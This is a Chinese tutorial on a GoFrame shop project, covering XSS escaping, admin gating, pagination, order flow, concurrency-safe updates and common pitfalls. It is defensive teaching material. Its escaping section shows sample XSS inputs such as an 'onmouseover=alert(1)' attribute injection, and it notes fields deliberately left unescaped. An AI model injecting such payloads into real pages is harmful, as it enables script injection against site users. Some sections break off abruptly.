**防御**：把用户输入里的特殊字符换成"显示用的符号"，让它变成普通文字而不是代码。

```js
// resource/public/index.html 第 678 行
function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;',    // & 要第一个换，否则会把后面换出来的 &amp; 再换一次
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  }[ch]));
}
```

转换后的效果：

| 原始 | 转义后 | 浏览器显示 |
|---|---|---|
| `<script>` | `&lt;script&gt;` | `<script>`（当文字显示，不执行） |
| `" onmouseover="alert(1)` | `&quot; onmouseover=&quot;alert(1)` | 原样显示，不会变成属性 |

`&` 必须第一个替换，这个细节很容易漏：如果先换 `<` 得到 `&lt;`，再换 `&`，就会把 `&lt;` 里的 `&` 又换成 `&amp;lt;`，显示出来是乱码。

**用在哪里**：

```js
// resource/public/index.html 第 749 行
function reviewItemHtml(r) {
  return `
    <div class="ritem">
      <div class="rh">
        <span>${esc(r.nickname)}${r.anonymous ? ' · 匿名' : ''}</span>
        <span>${esc(r.createdAt)}</span>
      </div>
      <div class="rt">${r.content ? esc(r.content) : '<span style="color:#bbb">该用户没有填写评价内容</span>'}</div>
      ...
```

`r.nickname` 和 `r.content` 都过了一遍 `esc`。而 `r.rating`（数字）不用，因为数字不可能含标签。

**项目里哪些地方转义了、哪些没有**：

| 字段 | 是否转义 | 原因 |
|---|---|---|
| 评价内容 `r.content` | ✅ | 用户自由填写 |
| 昵称 `r.nickname` | ✅ | 用户自由填写 |
| 商品名 `g.name` | ❌ | 只有管理员能填，且后台是可信的 |
| 收货地址 | ❌ | 只有自己能看到 |

严格来说商品名也该转义（万一管理员被钓鱼改了商品名），但当前取舍是"用户可见范围内，用户输入必须转义"。这个判断是合理的。

**后台页面也做了转义**：

```js
// resource/public/admin.html 第 647 行
const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
```

少转义了单引号，但因为后台用的是双引号属性，风险较低。

## 4.7 后台页的门禁：gate

后台页面加载时干的第一件事不是画界面，是**确认你有没有资格看**：

```js
// resource/public/admin.html 第 1446 行
async function boot() {
  // 1) 先确认登录态与角色
  try {
    state.me = await api('/user/info');
  } catch (e) {
    gate('请先登录', '后台管理需要登录态，请先到商城用管理员账号登录。');
    return;                                     // ← 直接结束，不往下走了
  }
  document.getElementById('who').textContent = `👤 ${state.me.nickname || state.me.username}`;

  // 2) 概览与分类
  await loadStats();
  await loadCategories();

  // 3) 默认展示商品
  loadGoods();

  // 4) 事件绑定
  document.querySelectorAll('.tabs button').forEach((b) => {
    b.onclick = () => switchTab(b.dataset.tab);
  });
  // ... 还有几十行绑定
}
```

**`/user/info` 这个接口是"试探"**：它只需要登录，不要求管理员。如果连它都失败，说明没登录，直接弹门禁。

**但这不是权限检查**。真正的检查发生在 `loadStats()` 里——那个接口在 `/admin` 组，要过 `Admin` 中间件：

```js
// resource/public/admin.html 第 600 行
async function api(path, opts = {}) {
  const res = await fetch(path, { credentials: 'same-origin', ...opts });
  let json;
  try {
    json = await res.json();
  } catch (e) {
    throw new Error('服务响应异常');
  }
  if (json.code === 61) {
    gate('请先登录', '后台管理需要登录态，请先到商城用管理员账号登录。');
    throw new Error('未登录');
  }
  if (json.code === 40301) {
    gate('需要管理员权限', '当前账号不是管理员，无法进入后台。如需使用，请让管理员把该账号设为管理员角色。');
    throw new Error('无权限');
  }
  if (json.code !== 0) {
    throw new Error(json.message || '请求失败');
  }
  return json.data;
}
```

**后台的 `api()` 比前台多两个判断**：61 和 40301，命中就弹门禁（`gate()` 显示一个覆盖全屏的提示卡片）。

这个写法很聪明：**不用在每个业务函数里判断权限**，只要统一在 `api()` 里拦一次。任何一个后台接口返回"没权限"，页面立刻变成提示页。

`gate()` 只是把一层遮罩显示出来：

```js
function gate(title, desc) {
  document.getElementById('gateTitle').textContent = title;
  document.getElementById('gateDesc').textContent = desc;
  document.getElementById('gate').classList.add('show');
}
```

`classList.add('show')` 加上这个 class，CSS 里 `.gate.show { display: flex }` 让遮罩显示出来。这是纯 CSS 控制显隐的常见手法——比 `style.display = 'block'` 好在样式都在 CSS 里，JS 只管开关。

## 4.8 后台的分页器：一个函数管所有列表

后台有 5 个列表（商品/分类/订单/用户/评价），每个都要分页。如果每个列表写一遍，就是 5 份重复代码。

项目的做法是抽一个通用函数：

```js
// resource/public/admin.html 第 1406 行
function renderPager(id, page, pageSize, total, onJump) {
  const pages = Math.max(1, Math.ceil(total / pageSize));
  const el = document.getElementById(id);
  if (pages <= 1) {
    el.innerHTML = '';
    return;
  }
  el.innerHTML = `
    <button class="btn ghost sm" ${page <= 1 ? 'disabled' : ''} data-p="${page - 1}">上一页</button>
    <span>第 ${page} / ${pages} 页 · 共 ${total} 条</span>
    <button class="btn ghost sm" ${page >= pages ? 'disabled' : ''} data-p="${page + 1}">下一页</button>`;
  el.querySelectorAll('button[data-p]').forEach((b) => {
    b.onclick = () => onJump(Number(b.dataset.p));
  });
}
```

调用：

```js
// resource/public/admin.html 第 1058 行
renderPager('userPager', d.page, d.pageSize, d.total, (p) => {
  state.users.page = p;
  loadUsers();
});
```

**为什么传 `onJump` 这个函数进来？**

因为每个列表翻页后要做的事不一样：用户列表要 `loadUsers()`，订单列表要 `loadOrders()`。如果把 `renderPager` 写死成调用某个特定函数，就没法复用了。

这叫**回调函数**：把"翻页之后干什么"作为参数传进来，由调用方决定。这是 JS 里最基本的解耦手段。

`Math.ceil(total / pageSize)` 是"向上取整"：总数 23 条、每页 10 条，需要 3 页（不是 2.3 页）。

`${page <= 1 ? 'disabled' : ''}` 在第一页时给"上一页"加上 `disabled` 属性，按钮就变灰不可点了。

## 4.9 完整走一遍：点"加入购物车"

把前面讲的东西串起来，看一个完整的交互。

**第一步：用户在商品卡片上点按钮**

```html
<button class="btn" onclick="addFromDetail(5)">加入购物车</button>
```

**第二步：`addFromDetail` 读数量，转调 `addToCart`**

```js
// resource/public/index.html 第 848 行
function addFromDetail(goodsId) {
  const q = Number(document.getElementById('dq').value) || 1;
  addToCart(goodsId, q);
}
```

`document.getElementById('dq').value` 读输入框的值——**注意它是字符串**，`"3"` 不是 `3`。所以要用 `Number()` 转。`|| 1` 兜底：如果用户清空了输入框，`Number('')` 是 0，0 是假值，就取 1。

**第三步：`addToCart` 判断登录态并发请求**

```js
async function addToCart(goodsId, qty) {
  if (!me) {
    pendingAdd = { goodsId, qty };
    openLogin('login');
    toast('请先登录');
    return;
  }
  try {
    const d = await api('/cart/add', { method: 'POST', body: { goodsId, quantity: qty } });
    await loadCart();                                  // 重新拉购物车
    toast(`已加入购物车，该商品共 ${d.quantity} 件`);
    openCart();                                        // 打开侧边抽屉
  } catch (e) {
    if (e.code === 61) {
      pendingAdd = { goodsId, qty };
      openLogin('login');
      return;
    }
    toast(e.message);
  }
}
```

注意这里同时处理了两种"没登录"：

- `if (!me)`：前端本地就知道没登录（`me` 是 null）
- `if (e.code === 61)`：前端以为登录了，但服务端说没有（Session 过期了）

第二种情况必须处理，因为 Session 可能在服务端过期，而浏览器里 `me` 这个变量还留着。

**第四步：`loadCart` 重新拉数据**

```js
async function loadCart() {
  try {
    cart = await api('/cart/list');
  } catch (e) {
    cart = { list: [], totalQuantity: 0, totalAmount: 0, invalidCount: 0 };
  }
  renderCart();
}
```

**这里的原则是"改完就重拉"**：不试图在本地算"购物车数量 +1"，而是重新问后端要一份完整数据。因为后端可能有别的变化（库存、下架），本地算容易和真实数据不一致。

代价是多一次请求。在这个数据量下完全无所谓，而且保证了对。

**第五步：`renderCart` 重画界面**

```js
function renderCart() {
  const count = cart.list.reduce((s, i) => s + i.quantity, 0);
  const badge = document.getElementById('cartBadge');
  badge.textContent = count;
  badge.classList.toggle('hide', count === 0);
  ...
}
```

`reduce` 是"把数组归约成一个值"。`(s, i) => s + i.quantity` 的意思是"从 0 开始，把每个商品的 quantity 累加"。3 件商品分别 1、2、3 个，结果是 6。

`classList.toggle('hide', count === 0)` 是"第二个参数为真就加 class，为假就删"。数量为 0 时隐藏角标。

## 4.10 为什么不用框架，这笔账怎么算

| | 原生（当前） | Vue / React |
|---|---|---|
| 起步成本 | 0，双击 HTML 就能看 | 装 Node、装依赖、跑构建 |
| 改一个字的流程 | 保存 → 刷新浏览器 | 保存 → 等热更新 |
| 数据变化后更新界面 | 手动重画 | 自动重画 |
| 代码量（本项目规模） | 约 2900 行 | 约 3500 行（多了模板语法和配置） |
| 复杂交互（如拖拽排序） | 很痛苦 | 有现成组件 |
| 多人协作 | 容易冲突 | 有组件边界，好分工 |

判断标准很简单：**页面数 × 交互复杂度**。这个项目 2 个页面、以表格和列表为主，原生更划算。

如果哪天要加"商品 SKU 多规格选择""实时聊天客服""复杂表单联动"，那就是框架更合适的时候——但那时大概率也要重写前端了。

# 第 5 章 把一条完整业务走通

前面把每块积木单独讲了，这一章把它们拼起来。跟着一个用户"小爱"从注册到评价走一遍，看每一步**调了哪个接口、动了哪张表、页面怎么变**。

## 5.1 注册

**用户操作**：点"登录/注册" → 切到"注册" → 填 alice / 123456 → 提交

**接口**：`POST /user/register` `{username:"alice", password:"123456", nickname:""}`

**经过的层**：

```
公开路由 → user 控制器 Register
  → service.User().Register
    → Count() 查用户名是否重复
    → bcrypt 哈希密码
    → 昵称为空 → 用用户名兜底
    → Insert 进 user 表
```

**数据库变化**：

```sql
INSERT INTO user (username, password, nickname, status) VALUES
('alice', '$2a$10$xxx...', 'alice', 1);
```

新行：`id=2, role=0, status=1, email=NULL, phone=NULL`

**页面变化**：注册成功后自动调一次登录（或提示去登录）。此时还没写 Session，`me` 仍是 null。

## 5.2 登录

**接口**：`POST /user/login` `{username:"alice", password:"123456"}`

**经过的层**：

```
公开路由 → user 控制器 Login
  → service.User().Login
    → 按 username 查 user 表
    → user 为 nil → "用户名或密码错误"
    → bcrypt 比对密码 → 不匹配 → "用户名或密码错误"
    → status != 1 → "账号已被禁用"
  ← 返回 user
  → 控制器 r.Session.Set("userId", user.Id)     ← 关键
```

**数据库变化**：无（只读）。

**内存变化**：服务端生成 Session，内容 `userId=2`，返回一个随机 SessionID 给浏览器。

**浏览器变化**：Cookie 里多了一个会话 ID（GoFrame 默认的 Cookie 名叫 `gfsessionid`，可以在配置里改）。

**页面变化**：`me = {id:2, username:"alice", nickname:"alice", role:0}`，顶栏从"登录/注册"变成"👤 alice 资料 改密码 退出"。

> 注意 `me` 是前端自己缓存的，和 Session 是两回事。刷新页面后 `me` 会被重新请求（`refreshMe()` 调 `/user/info`），Session 一直在 Cookie 里。

## 5.3 浏览商品

**接口**：`GET /goods/list?pageSize=50&categoryId=2`

**经过的层**：

```
公开路由 → goods 控制器 List
  → service.Goods().List
    → Where(status=1)               ← 只查上架
    → Where(category_id=2)          ← 如果选了分类
    → WhereLike(name, "%关键词%")   ← 如果有搜索
    → Page(1, 50) + OrderDesc(sales)
    → ScanAndCount
```

**数据库**：只读，两条 SQL（一条查数据，一条查总数）。

## 5.4 加入购物车

**接口**：`POST /cart/add` `{goodsId:5, quantity:2}`

**关键变化**：这一次请求要过 `Auth` 中间件了。

```
Auth 中间件
```

# 第 6 章 那些"看起来奇怪"的写法

这一章解释项目里几个反直觉的地方。每一条都是踩过坑之后改出来的。

## 6.1 为什么判断"记录存在"不能用 RowsAffected

**现象**：更新一条本来就存在的记录，`RowsAffected()` 返回 0。

```go
res, _ := dao.Goods.Ctx(ctx).WherePri(5).Data(g.Map{"name": "充电器"}).Update()
n, _ := res.RowsAffected()
// n = 0 —— 但这不代表商品不存在！
```

**原因**：MySQL 的 `UPDATE` 返回的"影响行数"是**真正被改变的行数**，不是"匹配到的行数"。如果新值和旧值完全一样，MySQL 认为"没有变化"，返回 0。

**后果**：如果代码写成下面这样就错了：

```go
// 错误写法
if n == 0 {
    return gerror.NewCode(gcode.CodeNotFound, "商品不存在")
}
```

用户在后台打开商品，什么都没改就点保存 → 返回"商品不存在" → 用户以为商品被删了。

**正确做法**：先 `Count()` 确认存在，再 `Update()`。

```go
// internal/logic/goods/goods.go 第 115 行
// 先确认记录存在。MySQL 在「提交的值与库里完全一致」时受影响行数为 0，
// 不能拿 RowsAffected 判断商品是否存在，否则原样保存会被误报为不存在。
count, err := dao.Goods.Ctx(ctx).WherePri(in.ID).Count()
if err != nil {
    return 0, err
}
if count == 0 {
    return 0, gerror.NewCode(gcode.CodeNotFound, "商品不存在")
}
if _, err = dao.Goods.Ctx(ctx).WherePri(in.ID).Data(data).Update(); err != nil {
    return 0, err
}
```

多一次 SQL，但正确。

**但注意：本章第 6.5 节的条件更新是另一回事**——那里 `RowsAffected == 0` 是**有意义**的，它表示"没有一行满足 `status = 原状态` 这个条件"，说明状态已经被改过了。两者的区别是：

| 场景 | RowsAffected == 0 的含义 | 能否用来判断 |
|---|---|---|
| 无条件更新（只按主键） | 值没变 | ❌ 不能 |
| 带状态条件更新 | 状态不对了 | ✅ 能 |

## 6.2 单列 Scan 到 `[]uint64` 会静默失败

**现象**：要查"某个订单下所有已评价的明细 ID"，写成这样：

```go
// 错误写法
var ids []uint64
dao.GoodsReview.Ctx(ctx).
    Fields("order_item_id").
    Where("order_id", 100).
    Scan(&ids)
// ids 是空的，而且不报错
```

**原因**：GoFrame 的 `Scan` 在把结果填入"基础类型切片"（`[]uint64`、`[]string`）时，行为不确定。它期望的是一行数据对应一个结构体，单列结果填进基础类型切片时，某些版本会静默跳过。

**后果**：项目里出了个真实的 bug——订单详情页的"已评价"标记永远是 false，因为 `ids` 永远是空的。用户评完价，那件商品还是显示"评价"按钮，点进去会被后端拒绝"已经评价过了"。

**正确做法**：扫到结构体切片。

```go
// internal/logic/order/order.go 第 248 行
// 注意这里扫到结构体切片而不是 []uint64：单列 Scan 到基础类型切片会静默返回空值。
func reviewedItemIDs(ctx context.Context, orderID uint64) (map[uint64]bool, error) {
	cols := dao.GoodsReview.Columns()

	var rows []struct {
		OrderItemId uint64 `orm:"order_item_id"`     // ← 结构体 + orm 标签
	}
	if err := dao.GoodsReview.Ctx(ctx).
		Fields(cols.OrderItemId).
		Where(cols.OrderId, orderID).
		Scan(&rows); err != nil {
		return nil, err
	}

	out := make(map[uint64]bool, len(rows))
	for _, r := range rows {
		out[r.OrderItemId] = true
	}
	return out, nil
}
```

**这条经验要记牢**：项目里所有"只查一列"的地方，都用结构体接。比如 `goodsCountByCategory`、`orderStatsByUser`、`Summary` 都是这个写法。

## 6.3 为什么空字符串要转成 NULL

第 1.3.1 节讲过原理（`UNIQUE` 下只能有一个空字符串，但可以有多个 NULL）。这里补充代码层面的处理。

**问题**：`email` 列是 `UNIQUE` + `DEFAULT NULL`。用户不填邮箱时，如果代码直接写 `""`：

```go
dao.User.Ctx(ctx).Data(g.Map{"email": ""}).Update()   // ❌ 第一个用户能存，第二个报错
```

第二个不填邮箱的用户会撞 `uk_email`，注册失败，提示"Duplicate entry '' for key 'uk_email'"——用户完全看不懂。

**解决**：

```go
// 空字符串 → nil → 数据库存 NULL
func nullableContact(v string) any {
	if v == "" {
		return nil
	}
	return v
}
```

返回类型是 `any`（任意类型），因为要能返回 `nil`。`g.Map` 里传 `nil`，GoFrame 会生成 `SET email = NULL`。

**所有写 email/phone 的地方都必须经过它**：

| 位置 | 用到 |
|---|---|
| `Register` | 不涉及（注册不收邮箱） |
| `UpdateProfile` | ✅ |
| `AdminSave` | ✅ |
| `AdminCreate` | ✅ |

漏一个就会出现"有的地方能存空，有的地方不能"的诡异现象。

## 6.4 为什么中间件不能放在 `internal/logic/` 下

**现象**：把中间件放在 `internal/logic/middleware/middleware.go`，跑 `gf gen service` 后：

1. 多出一个 `internal/service/middleware.go`，里面是个空的 `IMiddleware` 接口
2. 编译报错，或者中间件的行为变得奇怪

**原因**：`gf gen service` 的规则是"扫描 `internal/logic/` 下的每个子目录，为它生成一个服务接口"。它不知道 `middleware` 不是业务模块。

**解决**：把中间件移到 `internal/middleware/`，在 `logic/` 外面。这样生成器扫不到它。

这条经验可以推广：**`internal/logic/` 下只能放业务模块**（user、order、cart...），任何"基础设施"（中间件、工具函数）都要放到外面。

## 6.5 为什么状态流转要写成条件更新

**现象**：两个管理员同时点"发货"。

```go
// 错误写法
var order *entity.Orders
dao.Orders.Ctx(ctx).WherePri(100).Scan(&order)
if order.Status != 1 {
    return errors.New("状态不对")
}
dao.Orders.Ctx(ctx).WherePri(100).Data(g.Map{"status": 2}).Update()
```

两个请求同时执行：

```
请求 A：查 status = 1 ✓
请求 B：查 status = 1 ✓        ← A 还没改
请求 A：改成 2
请求 B：改成 2                  ← 重复执行了一次"发货"
```

如果发货这个动作还有副作用（发短信通知、调用物流接口），就会重复触发——用户收到两条发货短信。

**正确写法**：把判断塞进 WHERE 里。

```go
// internal/logic/order/order.go 第 519 行
res, err := dao.Orders.Ctx(ctx).
    WherePri(orderID).
    Where(cols.Status, from).       // ← 判断在 SQL 里
    Data(g.Map{cols.Status: to}).
    Update()
...
if affected == 0 {
    return gerror.NewCode(gcode.CodeNotFound, errMsg)
}
```

生成 `UPDATE ... WHERE id=100 AND status=1`。数据库执行 UPDATE 时会锁住这一行，两个请求排队：A 改完 status 变 2，B 的条件 `status=1` 不成立，影响 0 行，返回错误。

**同一个模式在项目里用了 4 次**：

| 位置 | 防什么 |
|---|---|
| `moveStatus`（发货/完成） | 重复发货、状态跳跃 |
| `Pay` | 重复付款 |
| `Cancel` | 重复取消（取消两次会把库存加回去两次） |
| `Create` 的扣库存 | 超卖 |

## 6.6 为什么"用户名或密码错误"是同一句话

第 3.1.2 节讲过，这里补一条延伸：**项目里还有几处类似的"提示合并"**。

| 场景 | 提示 | 为什么合并 |
|---|---|---|
| 登录：用户名不存在 / 密码错 | "用户名或密码错误" | 防用户枚举 |
| 商品详情：不存在 / 已下架 | "商品不存在或已下架" | 不暴露"存在但下架" |
| 评价：明细不存在 / 不是自己的 | "订单明细不存在" | 不暴露别人的订单 |
| 购物车：不存在 / 不是自己的 | "购物车项不存在" | 同上 |
| 订单取消：不存在 / 状态不对 | "订单不存在或当前状态不可取消" | 不暴露订单状态 |

共同原则：**报错信息只告诉"你这个操作失败了"，不告诉"失败的具体原因是系统里有/没有这个东西"。**

例外是"账号已被禁用"——这一条泄露了"账号存在"，但用户需要知道原因，否则会反复试密码。这是有意识的取舍。

## 6.7 为什么下单时价格要转两次

```go
itemCols.GoodsPrice: money.FromCents(money.ToCents(item.Price)),
//                    元 → 分 → 元，看起来等于原值
```

**它在做四舍五入到分。**

`item.Price` 来自 `goods.price`，数据库是 `decimal(10,2)`，理论上最多 2 位小数。但 GoFrame 把它读成 `float64` 之后，浮点表示会有微小误差：

```
99.99 可能变成 99.98999999999999
```

直接存回 `decimal(10,2)` 列，MySQL 会自己四舍五入，通常没问题。但 `subtotal`（小计）是用"单价 × 数量"算出来的：

```go
cents := money.ToCents(item.Price) * int64(item.Quantity)
```

如果 `item.Price = 99.989999`，`ToCents` 会 `Round(9998.9999)` = 9999，正确。但如果直接 `99.989999 * 3 = 299.969997`，存进 decimal 会变成 299.97，而 `9999 * 3 = 29997 分 = 299.97 元` 也是一样的。

所以这行代码在当前数据下**没有实际作用**，它是防御性的——保证写进库的单价和用来算小计的单价是同一个值。

代价是看起来像写错了。**更好的做法是加一行注释说明意图，或者直接删掉（因为 decimal(10,2) 保证不会有第 3 位小数）。**

## 6.8 为什么项目里有两个同名的 `currentUserID`

| 文件 | 签名 | 数据来源 |
|---|---|---|
| `controller/order/order_new.go` | `func currentUserID(ctx) uint64` | ctx 变量（Auth 中间件放的） |
| `controller/cart/cart_new.go` | `func currentUserID(ctx) uint64` | 同上，逐字重复 |
| `controller/admin/admin_helper.go` | `func currentUserID(ctx) uint64` | 同上，逐字重复 |
| `controller/user/user_helper.go` | `func currentUserID(ctx) (uint64, error)` | Session（自己读的） |

前三个是**同一个函数的三个副本**（因为是不同的包，无法共用）。第四个不同，因为 user 模块在公开分组里，没有 Auth 中间件帮忙放 ctx 变量。

理论上可以把前三个抽到一个公共包里，但 Go 的包循环依赖限制会让这事变麻烦（`middleware` 依赖 `service`，`controller` 依赖 `middleware`，如果再抽一个 `controller/helper` 包，依赖关系会更绕）。三份 4 行的函数，重复成本低于抽象成本。

**但这个名字重复确实容易误读**。如果哪天要重构，建议改成：

- `ctxUserID(ctx) uint64` —— 从上下文取
- `sessionUserID(ctx) (uint64, error)` —— 从 Session 取

名字不同，一眼就知道来源不同。

## 6.9 为什么前后端各写一个 `esc` 和 `money`

| 函数 | 前台 | 后台 | 差异 |
|---|---|---|---|
| `esc` | 转义 5 个字符（含单引号） | 转义 4 个字符 | 前台用于 `onclick='...'` 场景更多 |
| `money` / `fmt` | `money` 带 `<small>¥</small>`，`fmt` 纯文本 | `money` 纯文本 | 前台列表用大字价格，弹窗用纯文本 |
| `api` | 只处理业务错误 | 额外处理 61 / 40301 | 后台要弹门禁 |

为什么不做成公共 js 文件？

因为两个页面是**独立的单文件 HTML**，抽公共文件意味着：

1. 多一个 HTTP 请求（虽然可以缓存）
2. 多一个文件依赖，部署时容易漏
3. 改动一个函数要确认两个页面都不受影响

在 2 个页面、每个函数不到 10 行的规模下，"各写一份"是更省心的选择。**如果页面增加到 5 个以上，就该抽了。**

## 6.10 生成器的"退让"机制

**现象**：在 `api/user/` 下手写了一个 `myapi.go`，跑 `gf gen ctrl` 后，文件名变成了 `myapi.if.go`，而且编译报"重复定义"。

**原因**：`gf gen ctrl` 的规则是：

1. 如果某个接口方法在生成的文件里已经有了 → 跳过
2. 如果在别的文件里发现了同名的接口定义（手写的）→ 认为"用户想自己维护"，把自己的版本改名成 `.if.go`（`if` = interface，表示这是"兜底版本"）
3. 结果两个文件都定义了同一个接口 → 冲突

**规矩**：`api/<模块>/<模块>.go` 和 `internal/controller/<模块>/<模块>_v1_*.go` **不要手写**。要加接口，只在 `api/<模块>/v1/<模块>.go` 里加 Req/Res。

**`gf gen service` 有类似的机制**，但方向相反：如果发现 `internal/service/*.go` 有手写痕迹，就**跳过不生成**，日志打 "manually maintained"。

后果更隐蔽：改了 logic 的方法签名，`service` 没更新，编译报"方法签名不匹配"，但你看文件内容明明是旧的，不知道为什么没更新。

**解法：删掉 `internal/service/*.go` 再生成。**

```bash
rm internal/service/*.go
gf gen service
```

因为 `service` 里的内容全是从 `logic` 的方法签名推导出来的，删掉不会丢信息。

```go
package coupon

import (
	"context"
	"strings"

	"github.com/gogf/gf/v2/errors/gcode"
	"github.com/gogf/gf/v2/errors/gerror"

	"goshop/internal/dao"
	"goshop/internal/model"
	"goshop/internal/model/entity"
	"goshop/internal/service"
)

type sCoupon struct{}

func init() {
	service.RegisterCoupon(&sCoupon{})     // ← 必须注册，否则 service.Coupon() 会 panic
}

// List 优惠券列表
func (s *sCoupon) List(ctx context.Context, in model.CouponListInput) ([]entity.Coupon, int, error) {
	cols := dao.Coupon.Columns()
	m := dao.Coupon.Ctx(ctx)
	if in.Status >= 0 {
		m = m.Where(cols.Status, in.Status)
	}
	if in.Keyword != "" {
		m = m.WhereLike(cols.Name, "%"+in.Keyword+"%")
	}

	var (
		list  []entity.Coupon
		total int
	)
	if err := m.Page(in.Page, in.PageSize).OrderDesc(cols.Id).ScanAndCount(&list, &total, false); err != nil {
		return nil, 0, err
	}
	return list, total, nil
}

// Save 新建或编辑
func (s *sCoupon) Save(ctx context.Context, in model.CouponSaveInput) (uint64, error) {
	cols := dao.Coupon.Columns()
	name := strings.TrimSpace(in.Name)
	if name == "" {
		return 0, gerror.NewCode(gcode.CodeInvalidParameter, "券名称不能为空")
	}

	data := map[string]any{
		cols.Name:      name,
		cols.Amount:    in.Amount,
		cols.Threshold: in.Threshold,
		cols.Total:     in.Total,
		cols.Status:    in.Status,
	}

	if in.ID == 0 {
		id, err := dao.Coupon.Ctx(ctx).Data(data).InsertAndGetId()
		if err != nil {
			return 0, err
		}
		return uint64(id), nil
	}

	count, err := dao.Coupon.Ctx(ctx).WherePri(in.ID).Count()
	if err != nil {
		return 0, err
	}
	if count == 0 {
		return 0, gerror.NewCode(gcode.CodeNotFound, "优惠券不存在")
	}
	if _, err = dao.Coupon.Ctx(ctx).WherePri(in.ID).Data(data).Update(); err != nil {
		return 0, err
	}
	return in.ID, nil
}
```

## 7.4 改一条业务规则

**需求举例**：下单时"单个商品最多买 5 件"。

### 改哪里

**改 `internal/logic/cart/cart.go` 的 `Add` 和 `UpdateQuantity`**，不要改控制器。

```go
// 在库存校验旁边加
const maxPerGoods = 5

if quantity > maxPerGoods {
	return 0, 0, gerror.Newf("每件商品最多购买 %d 件", maxPerGoods)
}
```

**为什么不能改控制器？**

因为控制器是"搬运工"，它只负责把请求参数搬到业务层。如果规则写在控制器里：

- 别的入口（比如将来的"一键复购""后台代下单"）调同样的业务，就会绕过这个规则
- 写测试时要模拟 HTTP 请求，很麻烦

**为什么不能改 api 层的 `v:"..."` 校验？**

可以，`v:"between:1,5"` 确实能挡住。但那只挡住了"一次加 5 件以上"，挡不住"加 3 件 + 再加 3 件"（每次都在 5 以内，累计 6 件）。**累计逻辑只有业务层知道。**

正确的做法是两层都加：

- api 层 `v:"between:1,5"`：挡住明显不合法的请求，省一次数据库查询
- logic 层判断累计数量：挡住绕过前端的请求

这就是"前端校验提升体验，后端校验保证正确"。

### 类似规则的所在位置

| 规则 | 应该在哪个函数 |
|---|---|
| 每单最多买 N 件 | `cart.Add` + `cart.UpdateQuantity` |
| 订单满 99 免运费 | `order.Create` |
| 同一用户每天最多下 3 单 | `order.Create` |
| 评价只能在 7 天内 | `review.Create` |
| 商品下架后不能编辑 | `goods.AdminSave` |

```bash
MYSQL_PWD=123456 mysql --protocol=TCP -h 127.0.0.1 -uroot gfstudy < manifest/sql/schema.sql

# 执行升级脚本
MYSQL_PWD=123456 mysql --protocol=TCP -h 127.0.0.1 -uroot gfstudy < manifest/sql/upgrade/xxx.sql

# 看表结构
MYSQL_PWD=123456 mysql --protocol=TCP -h 127.0.0.1 -uroot gfstudy -e "show create table user\G"
```

**不要把密码写在 `-p` 后面**（`-p123456`），这台机器上会被环境变量干扰导致 Access denied。用 `MYSQL_PWD=xxx` 前缀。

# 附录 A 术语表

按出现顺序整理，方便回头查。

| 术语 | 一句话解释 |
|---|---|
| **API** | 接口。后端对外提供的"可以调用的功能"，用 URL + 参数表示 |
| **JSON** | 一种数据格式，`{"name":"张三","age":18}`，人和机器都容易读 |
| **HTTP** | 浏览器和服务器说话的语言。有 GET（要数据）、POST（交数据）等方法 |
| **Cookie** | 浏览器存的一小段文本，每次请求自动带上。用来存 Session 的钥匙 |
| **Session** | 服务器端的"会话记录"，存着"这个浏览器对应哪个用户" |
| **中间件** | 请求到达业务代码之前先执行的函数，用来做登录校验、日志等 |
| **路由** | "哪个 URL 交给哪个函数处理"的映射表 |
| **CRUD** | 增删改查（Create / Read / Update / Delete）的统称 |
| **DAO** | 数据访问对象，专门负责和数据库打交道的代码层 |
| **DTO** | 数据传输对象，层与层之间传数据用的结构体 |
| **ORM** | 对象关系映射，让你用操作结构体的方式操作数据库表 |
| **事务** | 一组操作要么全成功要么全失败 |
| **索引** | 数据库的目录，加速查询 |
| **唯一键** | 一种索引，额外保证这一列（或几列组合）不重复 |
| **主键** | 一行数据的唯一标识，通常是 `id` |
| **外键** | 指向另一张表主键的列，如 `order_item.order_id` |
| **N+1 查询** | 查 N 条主记录又逐条查子记录，产生 N+1 次 SQL 的性能问题 |
| **快照** | 把当时的数据复制一份存起来，不随后续变化 |
| **幂等** | 同一个操作执行多次，效果和执行一次相同 |
| **乐观锁** | 不加锁，靠"条件更新"保证并发正确性 |
| **XSS** | 跨站脚本攻击，往页面注入可执行代码 |
| **越权** | 访问了本不该有权限的数据，分水平（同级用户之间）和垂直（普通用户冒充管理员） |
| **哈希** | 单向加密，不可逆。密码存哈希而不是明文 |
| **bcrypt** | 一种专为密码设计的哈希算法，自带盐值、故意很慢 |
| **Session 过期** | 服务端清理了会话记录，用户需要重新登录 |
| **依赖倒置** | 高层模块不直接依赖低层实现，而是依赖接口 |
| **闭包** | 函数内部定义的函数，能访问外层变量 |
| **递归** | 函数调用自己，用来处理树形结构 |
| **模板字符串** | JS 里用反引号包起来的字符串，可以插变量、可以换行 |
| **DOM** | 浏览器里页面的元素树，JS 通过它改页面 |
| **innerHTML** | 元素的"内部 HTML"，赋值就能替换内容 |

# 写在最后

如果只能记住三件事，记这三件：

**1. 分层不是为了好看，是为了改得动。**
api 管"合同"，controller 管"搬运"，logic 管"规则"，dao 管"SQL"。改规则只动 logic，改接口只动 api，互不影响。

**2. 并发问题靠数据库，不靠代码判断。**
"先查再改"在并发下一定会出错。要么用条件更新（`WHERE status = 原状态`），要么用唯一键兜底，要么用事务。

**3. 前端的一切校验都可以被绕过。**
隐藏按钮、限制输入长度、`v:"..."` 规则，都只是提升体验。真正算数的只有后端 logic 里的判断。

需要看某个具体功能是怎么实现的，按附录 B 的接口清单找到路径，从 `internal/controller/` 对应的文件进去，一路追到 `internal/logic/`，就能看懂整条链路。
